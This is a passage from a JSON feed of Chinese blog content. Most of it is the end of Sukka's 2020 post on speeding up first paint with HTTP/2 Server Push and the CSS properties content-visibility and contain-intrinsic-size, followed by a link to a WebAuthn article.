href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中...」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/8.png\" width=\"1106\" height=\"945\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div>再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-03</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]